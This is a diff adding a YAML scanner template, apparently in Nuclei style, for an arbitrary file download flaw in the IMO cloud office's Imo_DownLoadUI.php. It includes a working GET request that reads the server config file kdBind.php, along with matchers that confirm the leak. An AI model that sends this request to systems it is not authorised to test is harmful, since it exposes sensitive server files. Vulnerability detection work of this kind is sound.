@@ -1,0 +1,30 @@
+id: imo-file-download
+brief:
+    title: IMO - Arbitrary File Download
+    by: ritikchaddha
+    level: high
+    about: The imo cloud office can read system sensitive files because the filename parameter of the /file/Placard/upload/Imo_DownLoadUI.php page is not strictly filtered.
+    label:
+        - imo
+        - file-download
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/file/Placard/upload/Imo_DownLoadUI.php?cid=1&uid=1&type=1&filename=/OpenPlatform/config/kdBind.php'
+      signs:
+        - "on": word
+          has:
+            - <?php
+            - $bindInfo = array
+          in: body
+          need: all
+        - "on": word
+          has:
+            - application/octet-stream
+            - filename=/home/www
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
